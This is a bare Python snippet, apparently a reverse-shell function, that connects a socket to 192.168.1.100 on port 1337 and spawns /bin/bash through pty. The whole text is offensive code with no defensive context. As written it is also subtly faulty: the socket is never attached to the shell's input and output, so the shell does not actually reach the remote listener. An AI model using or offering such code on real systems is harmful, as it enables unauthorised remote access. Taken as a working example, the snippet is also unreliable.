import pty, socket
def spawn_remote_pty(ip='192.168.1.100', port=1337):
    s = socket.socket()
    s.connect((ip, port))
    pty.spawn('/bin/bash')
